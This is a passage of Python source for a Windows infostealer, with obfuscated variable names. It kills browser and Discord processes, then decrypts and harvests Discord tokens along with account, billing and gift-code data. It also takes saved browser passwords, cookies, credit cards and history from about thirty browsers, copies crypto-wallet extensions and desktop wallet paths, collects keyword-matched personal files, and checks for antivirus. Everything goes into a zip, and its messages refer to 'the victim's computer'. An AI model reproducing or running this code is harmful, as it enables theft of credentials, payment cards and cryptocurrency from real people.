                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            if proc.name().lower() == proc_name.lower():
                                proc.kill()
                        except:
                            pass
            except:
                pass

            for name, path, proc_name in paths:
                if not os.path.exists(path):

                    continue
                _d15c0rd = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(os.path.join(path_appdata_roaming, _d15c0rd, 'Local State')):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        total_path = os.path.join(path, file_name)
                        if os.path.exists(total_path):
                            with open(total_path, errors='ignore') as file:
                                for line in file:
                                    for y in re.findall(regexp_enc, line.strip()):
                                        token = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(os.path.join(path_appdata_roaming, _d15c0rd, 'Local State')))
                                        if ValidateToken(token, base_url):
                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                            if uid not in uids:
                                                tokens.append(token)
                                                uids.append(uid)
                                                token_info[token] = (name, total_path)
                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        total_path = os.path.join(path, file_name)
                        if os.path.exists(total_path):
                            with open(total_path, errors='ignore') as file:
                                for line in file:
                                    for token in re.findall(regexp, line.strip()):
                                        if ValidateToken(token, base_url):
                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                            if uid not in uids:
                                                tokens.append(token)
                                                uids.append(uid)
                                                token_info[token] = (name, total_path)

            if os.path.exists(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
                for path, _, files in os.walk(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
                    for _file in files:
                        if _file.endswith('.sqlite'):
                            with open(os.path.join(path, _file), errors='ignore') as file:
                                for line in file:
                                    for token in re.findall(regexp, line.strip()):
                                        if ValidateToken(token, base_url):
                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                            if uid not in uids:
                                                tokens.append(token)
                                                uids.append(uid)
                                                token_info[token] = ('Firefox', os.path.join(path, _file))
            return tokens, token_info

        def ValidateToken(token, base_url):
            return requests.get(base_url, headers={'Authorization': token}).status_code == 200

        def DecryptVal(buff, master_key):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()

        def GetMasterKey(path):
            if not os.path.exists(path):
                return None
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]

        tokens, token_info = ExtractToken()
        
        if not tokens:
            file_discord_account = "No discord tokens found."

        for token_d15c0rd in tokens:
            number_discord_account += 1

            try: api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_d15c0rd}).json()
            except: api = {"None": "None"}

            u53rn4m3_d15c0rd = api.get('username', "None") + '#' + api.get('discriminator', "None")
            d15pl4y_n4m3_d15c0rd = api.get('global_name', "None")
            us3r_1d_d15c0rd = api.get('id', "None")
            em4i1_d15c0rd = api.get('email', "None")
            em4il_v3rifi3d_d15c0rd = api.get('verified', "None")
            ph0n3_d15c0rd = api.get('phone', "None")
            c0untry_d15c0rd = api.get('locale', "None")
            mf4_d15c0rd = api.get('mfa_enabled', "None")

            try:
                if api.get('premium_type', 'None') == 0:
                    n1tr0_d15c0rd = 'False'
                elif api.get('premium_type', 'None') == 1:
                    n1tr0_d15c0rd = 'Nitro Classic'
                elif api.get('premium_type', 'None') == 2:
                    n1tr0_d15c0rd = 'Nitro Boosts'
                elif api.get('premium_type', 'None') == 3:
                    n1tr0_d15c0rd = 'Nitro Basic'
                else:
                    n1tr0_d15c0rd = 'False'
            except:
                n1tr0_d15c0rd = "None"

            try: av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
            except: av4t4r_ur1_d15c0rd = "None"

            try:
                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_d15c0rd}).json()
                if billing_discord:
                    p4ym3nt_m3th0d5_d15c0rd = []

                    for method in billing_discord:
                        if method['type'] == 1:
                            p4ym3nt_m3th0d5_d15c0rd.append('Bank Card')
                        elif method['type'] == 2:
                            p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                        else:
                            p4ym3nt_m3th0d5_d15c0rd.append('Other')
                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
                else:
                    p4ym3nt_m3th0d5_d15c0rd = "None"
            except:
                p4ym3nt_m3th0d5_d15c0rd = "None"

            try:
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_d15c0rd}).json()
                if gift_codes:
                    codes = []
                    for g1ft_c0d35_d15c0rd in gift_codes:
                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
                        data = f"Gift: \"{name}\" Code: \"{g1ft_c0d35_d15c0rd}\""
                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
                            break
                        codes.append(data)
                    if len(codes) > 0:
                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
                    else:
                        g1ft_c0d35_d15c0rd = "None"
                else:
                    g1ft_c0d35_d15c0rd = "None"
            except:
                g1ft_c0d35_d15c0rd = "None"
        
            try: software_name, path = token_info.get(token_d15c0rd, ("Unknown", "Unknown"))
            except: software_name, path = "Unknown", "Unknown"

            file_discord_account = file_discord_account + f"""
Discord Account n°{str(number_discord_account)}:
- Path Found      : {path}
- Software        : {software_name}
- Token           : {token_d15c0rd}
- Username        : {u53rn4m3_d15c0rd}
- Display Name    : {d15pl4y_n4m3_d15c0rd}
- Id              : {us3r_1d_d15c0rd}
- Email           : {em4i1_d15c0rd}
- Email Verified  : {em4il_v3rifi3d_d15c0rd}
- Phone           : {ph0n3_d15c0rd}
- Nitro           : {n1tr0_d15c0rd}
- Language        : {c0untry_d15c0rd}
- Billing         : {p4ym3nt_m3th0d5_d15c0rd}
- Gift Code       : {g1ft_c0d35_d15c0rd}
- Profile Picture : {av4t4r_ur1_d15c0rd}
- Multi-Factor Authentication : {mf4_d15c0rd}
"""
        zip_file.writestr(f"Discord Accounts ({number_discord_account}).txt", file_discord_account)

        return number_discord_account

    @staticmethod
    def Interesting_Files(zip_file):
        path_userprofile = Paths().userprofile
        path_appdata_roaming = Paths().appdata_roaming
        extensions = ('.txt', '.log', '.ini', '.json', '.xml', '.csv', '.md', '.rtf', '.cfg', '.conf',
                    '.png', '.jpg', '.jpeg', '.bmp', '.gif', '.tiff', '.svg', '.webp',
                    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp',
                    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
                    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
                    '.mp3', '.wav', '.aac', '.flac', '.ogg'
                )

        paths = [
            os.path.join(path_userprofile, "Desktop"),
            os.path.join(path_userprofile, "Downloads"),
            os.path.join(path_userprofile, "Documents"),
            os.path.join(path_userprofile, "Picture"),
            os.path.join(path_userprofile, "Video"),
            os.path.join(path_userprofile, "OneDrive"),
            os.path.join(path_appdata_roaming, "Microsoft", "Windows", "Recent")
        ]

        keywords = [
            "2fa", "mfa", "2step", "otp", "verification", "verif", "verify",
            "acount", "account", "compte", "identifiant", "login", "conta", "contas",
            "personnel", "personal", "perso",
            "banque", "bank", "funds", "fonds", "paypal", "casino", "banco", "saldo",
            "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
            "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
            "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
            "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords", "senha", "senhas",
            "data", "donnée", "donnee", "donnees", "details",
            "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège",
            "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
            "identity", "identité", "passport", "passeport", "permis",
            "pin", "nip",
            "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille", "db", "database"
            "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
            "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
            "accountdata", "userdata", "logininfo", "seedbackup", "backup", "dados", "documento", "documentos",
            "WhatsApp", "whatsapp", "Telegram", "telegram"
        ]

        name_files = []

        for path in paths:
            for root, dirs, files in os.walk(path):
                for file in files:
                    try:
                        if file.lower().endswith(extensions):
                            file_name_no_ext = os.path.splitext(file)[0].lower()
                            for keyword in keywords:
                                try:
                                    if keyword.lower() == file_name_no_ext:
                                        full_path = os.path.join(root, file)
                                        if os.path.exists(full_path):
                                            name_files.append(file)
                                            base_name, ext = os.path.splitext(file)
                                            with open(full_path, "rb") as f:
                                                zip_file.writestr(os.path.join("Interesting Files", base_name + f"_{random.randint(1, 9999)}" + ext), f.read())
                                        break
                                except:
                                    pass
                    except:
                        pass

        if name_files:
            number_files = sum(len(phrase.split()) for phrase in name_files)
        else:
            number_files = 0

        return number_files

    @staticmethod 
    def Browser_Infos(zip_file, browser_choice):
        global number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards
        browsers = []
        number_cards = 0; file_cards = []
        number_cookies = 0; file_cookies = []
        number_history = 0; file_history = []
        number_passwords = 0; file_passwords = []
        number_downloads = 0; file_downloads = []
        number_extentions = 0

        path_appdata_local = Paths().appdata_local
        path_appdata_roaming = Paths().appdata_roaming

        def GetMasterKey(path):
            if not os.path.exists(path):
                return None

            try:
                with open(path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)

                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return master_key
            except:
                return None

        def Decrypt(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:-16]
                tag = buff[-16:]
                cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
                decryptor = cipher.decryptor()
                decrypted_pass = decryptor.update(payload) + decryptor.finalize()
                return decrypted_pass.decode()
            except:
                return None
            
        def GetPasswords(browser, profile_path, master_key):
            global number_passwords
            password_db = os.path.join(profile_path, 'Login Data')
            if not os.path.exists(password_db):
                return

            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(password_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url =          f"- Url      : {row[0]}"
                username =     f"  Username : {row[1]}"
                password =     f"  Password : {Decrypt(row[2], master_key)}"
                browser_name = f"  Browser  : {browser}"
                file_passwords.append(f"{url}\n{username}\n{password}\n{browser_name}\n")
                number_passwords += 1

            conn.close()

        def GetCookies(browser, profile_path, master_key):
            global number_cookies
            cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
            if not os.path.exists(cookie_db):
                return

            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(cookie_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                url =          f"- Url     : {row[0]}"
                name =         f"  Name    : {row[1]}"
                path =         f"  Path    : {row[2]}"
                cookie =       f"  Cookie  : {Decrypt(row[3], master_key)}"
                expire =       f"  Expire  : {row[4]}"
                browser_name = f"  Browser : {browser}"
                file_cookies.append(f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n{browser_name}\n")
                number_cookies += 1

            conn.close()

        def GetHistory(browser, profile_path):
            global number_history
            history_db = os.path.join(profile_path, 'History')
            if not os.path.exists(history_db):
                return
            
            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(history_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url =          f"- Url     : {row[0]}"
                title =        f"  Title   : {row[1]}"
                time =         f"  Time    : {row[2]}"
                browser_name = f"  Browser : {browser}"
                file_history.append(f"{url}\n{title}\n{time}\n{browser_name}\n")
                number_history += 1

            conn.close()
        
        def GetDownloads(browser, profile_path):
            global number_downloads
            downloads_db = os.path.join(profile_path, 'History')
            if not os.path.exists(downloads_db):
                return

            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(downloads_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                path =         f"- Path    : {row[1]}"
                url =          f"  Url     : {row[0]}"
                browser_name = f"  Browser : {browser}"
                file_downloads.append(f"{path}\n{url}\n{browser_name}\n")
                number_downloads += 1

            conn.close()
        
        def GetCards(browser, profile_path, master_key):
            global number_cards
            cards_db = os.path.join(profile_path, 'Web Data')
            if not os.path.exists(cards_db):
                return

            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(cards_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                name =             f"- Name             : {row[0]}"
                expiration_month = f"  Expiration Month : {row[1]}"
                expiration_year =  f"  Expiration Year  : {row[2]}"
                card_number =      f"  Card Number      : {Decrypt(row[3], master_key)}"
                date_modified =    f"  Date Modified    : {row[4]}"
                browser_name =     f"  Browser          : {browser}"
                file_cards.append(f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n{browser_name}\n")
                number_cards += 1
            
            conn.close()

        def GetExtentions(zip_file, extensions_names, browser, profile_path):
            global number_extentions
            extensions_path = os.path.join(profile_path, 'Extensions')
            zip_folder = os.path.join("Extensions", browser)

            if not os.path.exists(extensions_path):
                return 

            extentions = [item for item in os.listdir(extensions_path) if os.path.isdir(os.path.join(extensions_path, item))]
            
            for extention in extentions:
                if "Temp" in extention:
                    continue
                
                number_extentions += 1
                extension_found = False
                
                for extension_name, extension_folder in extensions_names:
                    if extention == extension_folder:
                        extension_found = True
                        
                        extension_folder_path = os.path.join(zip_folder, extension_name, extention)
                        
                        source_extension_path = os.path.join(extensions_path, extention)
                        for item in os.listdir(source_extension_path):
                            item_path = os.path.join(source_extension_path, item)
                            
                            if os.path.isdir(item_path):
                                for dirpath, dirnames, filenames in os.walk(item_path):
                                    for filename in filenames:
                                        file_path = os.path.join(dirpath, filename)
                                        arcname = os.path.relpath(file_path, source_extension_path)
                                        zip_file.write(file_path, os.path.join(extension_folder_path, arcname))
                            else:
                                zip_file.write(item_path, os.path.join(extension_folder_path, item))
                        break

                if not extension_found:
                    other_folder_path = os.path.join(zip_folder, "Unknown Extension", extention)
                    
                    source_extension_path = os.path.join(extensions_path, extention)
                    for item in os.listdir(source_extension_path):
                        item_path = os.path.join(source_extension_path, item)
                        
                        if os.path.isdir(item_path):
                            for dirpath, dirnames, filenames in os.walk(item_path):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, source_extension_path)
                                    zip_file.write(file_path, os.path.join(other_folder_path, arcname))
                        else:
                            zip_file.write(item_path, os.path.join(other_folder_path, item))

        browser_files = [
            ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(path_appdata_local,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(path_appdata_local,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(path_appdata_local,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(path_appdata_local,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(path_appdata_local,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
            ("Microsoft Edge",         os.path.join(path_appdata_local,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
            ("Opera",                  os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable"),                "opera.exe"),
            ("Opera GX",               os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable"),             "opera.exe"),
            ("Opera Neon",             os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon"),                  "opera.exe"),
            ("Brave",                  os.path.join(path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
            ("Vivaldi",                os.path.join(path_appdata_local,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
            ("Internet Explorer",      os.path.join(path_appdata_local,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
            ("Amigo",                  os.path.join(path_appdata_local,   "Amigo", "User Data"),                            "amigo.exe"),
            ("Torch",                  os.path.join(path_appdata_local,   "Torch", "User Data"),                            "torch.exe"),
            ("Kometa",                 os.path.join(path_appdata_local,   "Kometa", "User Data"),                           "kometa.exe"),
            ("Orbitum",                os.path.join(path_appdata_local,   "Orbitum", "User Data"),                          "orbitum.exe"),
            ("Cent Browser",           os.path.join(path_appdata_local,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
            ("7Star",                  os.path.join(path_appdata_local,   "7Star", "7Star", "User Data"),                   "7star.exe"),
            ("Sputnik",                os.path.join(path_appdata_local,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
            ("Epic Privacy Browser",   os.path.join(path_appdata_local,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
            ("Uran",                   os.path.join(path_appdata_local,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
            ("Yandex",                 os.path.join(path_appdata_local,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
            ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data"),                          "iridium.exe"),
            ("Mozilla Firefox",        os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
            ("Safari",                 os.path.join(path_appdata_roaming, "Apple Computer", "Safari"),                      "safari.exe"),
        ]

        profiles = [
            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
        ]

        extensions_names = [
            ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
            ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
            ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
            ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
            ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
            ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
            ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
            ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
            ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
            ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
            ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
            ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
            ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
            ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
            ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
            ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
            ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
            ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
            ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
            ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
            ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
            ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
            ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
            ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
            ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
            ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
            ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
            ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
            ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
            ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
            ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
            ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
            ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
            ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
            ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
            ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
            ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
            ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
            ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
            ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
            ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
            ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
            ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
            ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
        ]
        
        try:
            for name, path, proc_name in browser_files:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.name().lower() == proc_name.lower():
                            proc.kill()
                    except:
                        pass
        except:
            pass

        for name, path, proc_name in browser_files:
            if not os.path.exists(path):
                continue

            master_key = GetMasterKey(os.path.join(path, 'Local State'))
            if not master_key:
                continue

            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue

            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue
                
                if "extentions" in browser_choice:
                    try:
                        GetExtentions(zip_file, extensions_names, name, profile_path)
                    except:
                        pass

                if "passwords" in browser_choice:
                    try:
                        GetPasswords(name, profile_path, master_key)
                    except:
                        pass

                if "cookies" in browser_choice:
                    try:
                        GetCookies(name, profile_path, master_key)
                    except:
                        pass

                if "history" in browser_choice:
                    try:
                        GetHistory(name, profile_path)
                    except:
                        pass

                if "downloads" in browser_choice:
                    try:
                        GetDownloads(name, profile_path)
                    except:
                        pass

                if "cards" in browser_choice:
                    try:
                        GetCards(name, profile_path, master_key)
                    except:
                        pass

                if name not in browsers:
                    browsers.append(name)

        if "passwords" in browser_choice:
            if not file_passwords:
                file_passwords.append("No passwords was saved on the victim's computer.")
            file_passwords = "\n".join(file_passwords)

        if "cookies" in browser_choice:
            if not file_cookies:
                file_cookies.append("No cookies was saved on the victim's computer.")
            file_cookies   = "\n".join(file_cookies)

        if "history" in browser_choice:
            if not file_history:
                file_history.append("No history was saved on the victim's computer.")
            file_history   = "\n".join(file_history)

        if "downloads" in browser_choice:
            if not file_downloads:
                file_downloads.append("No downloads was saved on the victim's computer.")
            file_downloads = "\n".join(file_downloads)

        if "cards" in browser_choice:
            if not file_cards:
                file_cards.append("No cards was saved on the victim's computer.")
            file_cards     = "\n".join(file_cards)
        
        if number_passwords != None:
            zip_file.writestr(f"Passwords ({number_passwords}).txt", file_passwords)

        if number_cookies != None:
            zip_file.writestr(f"Cookies ({number_cookies}).txt", file_cookies)

        if number_cards != None:
            zip_file.writestr(f"Cards ({number_cards}).txt", file_cards)

        if number_history != None:
            zip_file.writestr(f"Browsing History ({number_history}).txt", file_history)

        if number_downloads != None:
            zip_file.writestr(f"Download History ({number_downloads}).txt",file_downloads)

        return number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards

    @staticmethod
    def AntiVirus_Infos(zip_file):
        path_program_files = Paths().program_files
        path_program_files_x86 = Paths().program_files_x86
        antivirus_list = [
            "Avast Antivirus",
            "AVG Antivirus",
            "Avira Antivirus",
            "Bitdefender Antivirus",
            "Kaspersky Antivirus",
            "McAfee Antivirus",
            "Norton Antivirus",
            "ESET NOD32 Antivirus",
            "Trend Micro Antivirus",
            "Windows Defender",
            "Malwarebytes",
            "Sophos Home",
            "Panda Dome",
            "F-Secure SAFE",
            "Webroot SecureAnywhere",
            "BullGuard Antivirus",
            "ZoneAlarm Free Antivirus",
            "Adaware Antivirus",
            "Comodo Antivirus",
            "360 Total Security"
        ]

        found_antivirus = []

        for antivirus in antivirus_list:
            paths_to_check = [
                os.path.join(path_program_files, antivirus),
                os.path.join(path_program_files_x86, antivirus)
            ]
            for path in paths_to_check:
                if os.path.exists(path):
                    found_antivirus.append(antivirus)
                    break

        if found_antivirus:
            antivirus_info = "Antivirus software found on the system:\n- " + "\n- ".join(found_antivirus)
        else:
            antivirus_info = "No antivirus software found on the system."

        zip_file.writestr("Antivirus Info.txt", antivirus_info)

        return len(found_antivirus)

    @staticmethod
    def Session_files(zip_file, session_files_choice):
        path_appdata_roaming   = Paths().appdata_roaming
        path_appdata_local     = Paths().appdata_local
        path_program_files = Paths().program_files

        name_game_launchers  = [] if "Game Launchers" in session_files_choice else None
        name_wallets         = [] if "Wallets" in session_files_choice else None
        name_apps            = [] if "Apps" in session_files_choice else None

        session_files = [
            ("Zcash",             os.path.join(path_appdata_roaming,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
            ("Armory",            os.path.join(path_appdata_roaming,   "Armory"),                                                     "armory.exe",            "Wallets"),
            ("Bytecoin",          os.path.join(path_appdata_roaming,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
            ("Guarda",            os.path.join(path_appdata_roaming,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
            ("Atomic Wallet",     os.path.join(path_appdata_roaming,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
            ("Exodus",            os.path.join(path_appdata_roaming,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
            ("Binance",           os.path.join(path_appdata_roaming,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
            ("Jaxx Liberty",      os.path.join(path_appdata_roaming,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
            ("Electrum",          os.path.join(path_appdata_roaming,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
            ("Coinomi",           os.path.join(path_appdata_roaming,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
            ("Trust Wallet",      os.path.join(path_appdata_roaming,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
            ("AtomicDEX",         os.path.join(path_appdata_roaming,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
            ("Wasabi Wallet",     os.path.join(path_appdata_roaming,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
            ("Ledger Live",       os.path.join(path_appdata_roaming,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
            ("Trezor Suite",      os.path.join(path_appdata_roaming,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
            ("Blockchain Wallet", os.path.join(path_appdata_roaming,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
            ("Mycelium",          os.path.join(path_appdata_roaming,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
            ("Crypto.com",        os.path.join(path_appdata_roaming,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
            ("BRD",               os.path.join(path_appdata_roaming,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
